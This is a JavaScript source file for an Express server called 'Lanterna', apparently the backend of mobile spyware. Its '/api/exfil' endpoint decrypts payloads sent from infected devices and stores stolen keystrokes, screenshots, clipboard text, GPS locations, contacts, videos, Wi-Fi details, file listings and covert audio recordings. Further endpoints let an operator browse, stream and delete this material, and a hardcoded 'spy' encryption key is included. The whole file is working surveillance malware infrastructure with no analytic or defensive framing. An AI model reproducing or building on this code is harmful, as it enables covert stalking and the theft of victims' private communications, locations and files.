require('dotenv').config();

const express = require('express');
const cors = require('cors');
const multer = require('multer');
const path = require('path');
const crypto = require('crypto');
const { pool, initDB } = require('./db');

const app = express();
const PORT = process.env.PORT || 3001;
const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || 'L4nt3rn4_Spy_K3y_2026_!@#Secure';

const upload = multer({
  storage: multer.memoryStorage(),
  limits: { fileSize: 200 * 1024 * 1024 },
  fileFilter: (_req, file, cb) => {
    if (/^audio\//.test(file.mimetype) || /^video\//.test(file.mimetype) ||
      /\.(m4a|mp3|wav|aac|ogg|webm|mp4|mov|avi)$/i.test(file.originalname)) {
      cb(null, true);
    } else {
      cb(new Error('Only audio/video files are allowed'));
    }
  },
});

app.use(cors());
app.use(express.json({ limit: '200mb' }));
app.use(express.urlencoded({ extended: true, limit: '200mb' }));

// ─── Decrypt ────────────────────────────────────────────────────────────────

function decryptPayload(encryptedB64) {
  try {
    const encrypted = Buffer.from(encryptedB64, 'base64');
    const iv = encrypted.subarray(0, 16);
    const ciphertext = encrypted.subarray(16);
    const key = crypto.createHash('sha256').update(ENCRYPTION_KEY).digest();
    const decipher = crypto.createDecipheriv('aes-256-cbc', key, iv);
    let decrypted = decipher.update(ciphertext);
    // autoPadding (ativo por defeito) já remove o padding PKCS7 —
    // não remover manualmente outra vez, senão corrompe o JSON
    decrypted = Buffer.concat([decrypted, decipher.final()]);
    return JSON.parse(decrypted.toString('utf8'));
  } catch (err) {
    console.error('Decryption error:', err.message);
    return null;
  }
}

// ─── Health ──────────────────────────────────────────────────────────────────

app.get('/health', (_req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// ═════════════════════════════════════════════════════════════════════════════
// UNIVERSAL EXFIL
// ═════════════════════════════════════════════════════════════════════════════

app.post('/api/exfil', async (req, res) => {
  try {
    const { payload } = req.body;
    if (!payload) return res.status(400).json({ error: 'No payload' });

    const data = decryptPayload(payload);
    if (!data) return res.status(400).json({ error: 'Invalid payload' });

    const { type, timestamp, device_id } = data;
    const capturedAt = timestamp ? new Date(timestamp) : new Date();

    switch (type) {
      case 'keystrokes': {
        const { data: kData, length } = data;
        await pool.query(
          `INSERT INTO keystrokes (data, char_length, device_id, captured_at) VALUES ($1,$2,$3,$4)`,
          [kData, length || kData.length, device_id, capturedAt]
        );
        break;
      }
      case 'device_info': {
        const { platform, model, brand, os_version, ...rest } = data;
        await pool.query(
          `INSERT INTO device_info (platform, model, brand, os_version, raw_data, device_id, captured_at) VALUES ($1,$2,$3,$4,$5,$6,$7)`,
          [platform || 'unknown', model || null, brand || null, os_version || null, JSON.stringify(rest), device_id, capturedAt]
        );
        break;
      }
      case 'screenshot': {
        const { image_b64, size_bytes } = data;
        const buf = Buffer.from(image_b64, 'base64');
        await pool.query(
          `INSERT INTO screenshots (image_data, size_bytes, device_id, captured_at) VALUES ($1,$2,$3,$4)`,
          [buf, size_bytes || buf.length, device_id, capturedAt]
        );
        break;
      }
      case 'clipboard': {
        const { text, length: cLen } = data;
        await pool.query(
          `INSERT INTO clipboards (text, char_length, device_id, captured_at) VALUES ($1,$2,$3,$4)`,
          [text, cLen || text.length, device_id, capturedAt]
        );
        break;
      }
      case 'location': {
        const { lat, lng, accuracy, altitude, speed } = data;
        await pool.query(
          `INSERT INTO locations (latitude, longitude, accuracy, altitude, speed, device_id, captured_at) VALUES ($1,$2,$3,$4,$5,$6,$7)`,
          [lat, lng, accuracy || null, altitude || null, speed || null, device_id, capturedAt]
        );
        break;
      }
      case 'network': {
        const { ssid, bssid, ip, subnet_mask, broadcast, gateway } = data;
        await pool.query(
          `INSERT INTO network_info (ssid, bssid, ip_address, subnet_mask, broadcast, gateway, device_id, captured_at) VALUES ($1,$2,$3,$4,$5,$6,$7,$8)`,
          [ssid, bssid, ip, subnet_mask, broadcast, gateway, device_id, capturedAt]
        );
        break;
      }
      case 'contacts': {
        const { count, contacts } = data;
        await pool.query(
          `INSERT INTO contacts_snapshot (contact_count, contacts_json, device_id, captured_at) VALUES ($1,$2,$3,$4)`,
          [count || 0, JSON.stringify(contacts || []), device_id, capturedAt]
        );
        break;
      }
      case 'video': {
        const { video_b64, size_bytes: vSize, mime_type } = data;
        const vBuf = Buffer.from(video_b64, 'base64');
        await pool.query(
          `INSERT INTO videos (video_data, size_bytes, mime_type, device_id, captured_at) VALUES ($1,$2,$3,$4,$5)`,
          [vBuf, vSize || vBuf.length, mime_type || 'video/mp4', device_id, capturedAt]
        );
        break;
      }
      case 'file_scan': {
        const { count: fCount, directory, files } = data;
        await pool.query(
          `INSERT INTO file_scans (file_count, directory, files_json, device_id, captured_at) VALUES ($1,$2,$3,$4,$5)`,
          [fCount || 0, directory || null, JSON.stringify(files || []), device_id, capturedAt]
        );
        break;
      }
      default:
        await pool.query(
          `INSERT INTO unknown_exfil (payload_type, raw_data, device_id, captured_at) VALUES ($1,$2,$3,$4)`,
          [type || 'unknown', JSON.stringify(data), device_id, capturedAt]
        );
    }
    res.status(201).json({ status: 'ok', type });
  } catch (err) {
    console.error('POST /api/exfil error:', err);
    res.status(500).json({ error: 'Internal server error', detail: err.message });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// ÁUDIO
// ═════════════════════════════════════════════════════════════════════════════

app.post('/api/recordings', upload.single('audio'), async (req, res) => {
  try {
    if (!req.file) return res.status(400).json({ error: 'No audio file' });
    const { duration, filename: originalName, recorded_at, device_info } = req.body;
    const storedFilename = originalName || req.file.originalname || 'recording.webm';
    const recordedAt = recorded_at ? new Date(recorded_at) : new Date();
    const durationInt = duration ? parseInt(duration, 10) : null;
    const result = await pool.query(
      `INSERT INTO recordings (filename, original_name, duration, file_size, recorded_at, device_info, audio_data)
       VALUES ($1,$2,$3,$4,$5,$6,$7) RETURNING id, filename, original_name, duration, file_size, recorded_at, uploaded_at`,
      [storedFilename, storedFilename, durationInt, req.file.size, recordedAt, device_info || null, req.file.buffer]
    );
    res.status(201).json({ recording: result.rows[0] });
  } catch (err) {
    console.error('POST /api/recordings error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/recordings', async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(100, parseInt(req.query.limit, 10) || 10);
    const offset = (page - 1) * limit;
    const [d, c] = await Promise.all([
      pool.query(`SELECT id, filename, original_name, duration, file_size, recorded_at, uploaded_at, device_info FROM recordings ORDER BY uploaded_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
      pool.query(`SELECT COUNT(*) AS total FROM recordings`),
    ]);
    res.json({ recordings: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
  } catch (err) {
    console.error('GET /api/recordings error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/recordings/stats', async (req, res) => {
  try {
    const r = await pool.query(`SELECT COUNT(*) AS total_recordings, COALESCE(SUM(duration),0) AS total_duration_seconds, COALESCE(SUM(file_size),0) AS total_file_size_bytes FROM recordings`);
    res.json(r.rows[0]);
  } catch (err) {
    console.error('GET /api/recordings/stats error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/recordings/:id', async (req, res) => {
  try {
    const r = await pool.query(`SELECT id, filename, original_name, duration, file_size, recorded_at, uploaded_at, device_info FROM recordings WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ recording: r.rows[0] });
  } catch (err) {
    console.error('GET /api/recordings/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/recordings/:id/audio', async (req, res) => {
  try {
    const r = await pool.query(`SELECT filename, original_name, audio_data FROM recordings WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    const rec = r.rows[0];
    if (!rec.audio_data) return res.status(404).json({ error: 'No audio data' });
    const buf = Buffer.from(rec.audio_data);
    const ext = path.extname(rec.filename).toLowerCase();
    const mimeMap = { '.m4a': 'audio/mp4', '.mp3': 'audio/mpeg', '.wav': 'audio/wav', '.aac': 'audio/aac', '.ogg': 'audio/ogg', '.webm': 'audio/webm' };
    res.setHeader('Content-Type', mimeMap[ext] || 'audio/octet-stream');
    res.setHeader('Content-Length', buf.length);
    res.setHeader('Content-Disposition', `inline; filename="${rec.original_name || rec.filename}"`);
    res.send(buf);
  } catch (err) {
    console.error('GET /api/recordings/:id/audio error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/recordings/:id', async (req, res) => {
  try {
    const r = await pool.query(`DELETE FROM recordings WHERE id = $1 RETURNING id, filename`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ message: 'Deleted', recording: r.rows[0] });
  } catch (err) {
    console.error('DELETE /api/recordings/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// KEYSTROKES
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/keystrokes', async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(100, parseInt(req.query.limit, 10) || 15);
    const offset = (page - 1) * limit;
    const [d, c] = await Promise.all([
      pool.query(`SELECT id, char_length, device_id, captured_at FROM keystrokes ORDER BY captured_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
      pool.query(`SELECT COUNT(*) AS total FROM keystrokes`),
    ]);
    res.json({ keystrokes: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
  } catch (err) {
    console.error('GET /api/keystrokes error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/keystrokes/:id', async (req, res) => {
  try {
    const r = await pool.query(`SELECT id, data, char_length, device_id, captured_at FROM keystrokes WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ keystroke: r.rows[0] });
  } catch (err) {
    console.error('GET /api/keystrokes/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/keystrokes/:id', async (req, res) => {
  try {
    const r = await pool.query(`DELETE FROM keystrokes WHERE id = $1 RETURNING id`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ message: 'Deleted', id: r.rows[0].id });
  } catch (err) {
    console.error('DELETE /api/keystrokes/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// SCREENSHOTS
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/screenshots', async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(50, parseInt(req.query.limit, 10) || 12);
    const offset = (page - 1) * limit;
    const [d, c] = await Promise.all([
      pool.query(`SELECT id, size_bytes, device_id, captured_at FROM screenshots ORDER BY captured_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
      pool.query(`SELECT COUNT(*) AS total FROM screenshots`),
    ]);
    res.json({ screenshots: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
  } catch (err) {
    console.error('GET /api/screenshots error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/screenshots/:id', async (req, res) => {
  try {
    const r = await pool.query(`SELECT id, image_data, size_bytes, device_id, captured_at FROM screenshots WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    const ss = r.rows[0];
    res.json({ screenshot: { id: ss.id, image_b64: ss.image_data ? Buffer.from(ss.image_data).toString('base64') : null, size_bytes: ss.size_bytes, device_id: ss.device_id, captured_at: ss.captured_at } });
  } catch (err) {
    console.error('GET /api/screenshots/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/screenshots/:id', async (req, res) => {
  try {
    const r = await pool.query(`DELETE FROM screenshots WHERE id = $1 RETURNING id`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ message: 'Deleted', id: r.rows[0].id });
  } catch (err) {
    console.error('DELETE /api/screenshots/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// LOCATIONS
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/locations', async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(100, parseInt(req.query.limit, 10) || 10);
    const offset = (page - 1) * limit;
    const [d, c] = await Promise.all([
      pool.query(`SELECT id, latitude, longitude, accuracy, altitude, speed, device_id, captured_at FROM locations ORDER BY captured_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
      pool.query(`SELECT COUNT(*) AS total FROM locations`),
    ]);
    res.json({ locations: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
  } catch (err) {
    console.error('GET /api/locations error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/locations/:id', async (req, res) => {
  try {
    const r = await pool.query(`DELETE FROM locations WHERE id = $1 RETURNING id`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ message: 'Deleted', id: r.rows[0].id });
  } catch (err) {
    console.error('DELETE /api/locations/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// VIDEOS
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/videos', async (req, res) => {
  try {
    const page = Math.max(1, parseInt(req.query.page, 10) || 1);
    const limit = Math.min(50, parseInt(req.query.limit, 10) || 12);
    const offset = (page - 1) * limit;
    const [d, c] = await Promise.all([
      pool.query(`SELECT id, size_bytes, mime_type, device_id, captured_at FROM videos ORDER BY captured_at DESC LIMIT $1 OFFSET $2`, [limit, offset]),
      pool.query(`SELECT COUNT(*) AS total FROM videos`),
    ]);
    res.json({ videos: d.rows, pagination: { page, limit, total: parseInt(c.rows[0].total, 10), totalPages: Math.ceil(parseInt(c.rows[0].total, 10) / limit) } });
  } catch (err) {
    console.error('GET /api/videos error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/videos/:id', async (req, res) => {
  try {
    const r = await pool.query(`SELECT id, video_data, size_bytes, mime_type, device_id, captured_at FROM videos WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    const vid = r.rows[0];
    res.json({ video: { id: vid.id, video_b64: vid.video_data ? Buffer.from(vid.video_data).toString('base64') : null, size_bytes: vid.size_bytes, mime_type: vid.mime_type, device_id: vid.device_id, captured_at: vid.captured_at } });
  } catch (err) {
    console.error('GET /api/videos/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.get('/api/videos/:id/stream', async (req, res) => {
  try {
    const r = await pool.query(`SELECT video_data, size_bytes, mime_type FROM videos WHERE id = $1`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    const vid = r.rows[0];
    if (!vid.video_data) return res.status(404).json({ error: 'No video data' });
    const buf = Buffer.from(vid.video_data);
    const mime = vid.mime_type || 'video/mp4';
    res.setHeader('Content-Type', mime);
    res.setHeader('Content-Length', buf.length);
    res.setHeader('Content-Disposition', `inline; filename="video_${req.params.id}.mp4"`);
    res.send(buf);
  } catch (err) {
    console.error('GET /api/videos/:id/stream error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

app.delete('/api/videos/:id', async (req, res) => {
  try {
    const r = await pool.query(`DELETE FROM videos WHERE id = $1 RETURNING id`, [req.params.id]);
    if (!r.rows.length) return res.status(404).json({ error: 'Not found' });
    res.json({ message: 'Deleted', id: r.rows[0].id });
  } catch (err) {
    console.error('DELETE /api/videos/:id error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// DEVICES
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/devices', async (req, res) => {
  try {
    const r = await pool.query(
      `SELECT DISTINCT ON (device_id) id, platform, model, brand, os_version, raw_data, device_id, captured_at
       FROM device_info WHERE device_id IS NOT NULL ORDER BY device_id, captured_at DESC`
    );
    res.json({ devices: r.rows });
  } catch (err) {
    console.error('GET /api/devices error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// STATS AGREGADAS
// ═════════════════════════════════════════════════════════════════════════════

app.get('/api/stats', async (req, res) => {
  try {
    const [k, rec, ss, loc, dev, con, vid] = await Promise.all([
      pool.query('SELECT COUNT(*) AS total, COALESCE(SUM(char_length),0) AS chars FROM keystrokes'),
      pool.query('SELECT COUNT(*) AS total FROM recordings'),
      pool.query('SELECT COUNT(*) AS total FROM screenshots'),
      pool.query('SELECT COUNT(*) AS total FROM locations'),
      pool.query('SELECT COUNT(*) AS total FROM device_info'),
      pool.query('SELECT COUNT(*) AS total FROM contacts_snapshot'),
      pool.query('SELECT COUNT(*) AS total FROM videos'),
    ]);
    res.json({ keystrokes: k.rows[0], recordings: rec.rows[0], screenshots: ss.rows[0], locations: loc.rows[0], devices: dev.rows[0], contacts_snapshots: con.rows[0], videos: vid.rows[0] });
  } catch (err) {
    console.error('GET /api/stats error:', err);
    res.status(500).json({ error: 'Internal server error' });
  }
});

// ═════════════════════════════════════════════════════════════════════════════
// STATIC & ERROR HANDLER
// ═════════════════════════════════════════════════════════════════════════════

const publicDir = path.join(__dirname, '..', 'public');
app.use(express.static(publicDir));
app.get('*', (req, res) => res.sendFile(path.join(publicDir, 'index.html')));
app.use((err, _req, res, _next) => {
  console.error('Unhandled error:', err);
  res.status(err.status || 500).json({ error: err.message || 'Internal server error' });
});

// ─── Start ──────────────────────────────────────────────────────────────────

async function start() {
  await initDB();
  app.listen(PORT, () => {
    console.log(`Lanterna backend running on port ${PORT}`);
    console.log(`Encryption key hash: ${crypto.createHash('sha256').update(ENCRYPTION_KEY).digest('hex').substring(0, 16)}...`);
  });
}

start().catch((err) => { console.error('Failed to start:', err); process.exit(1); });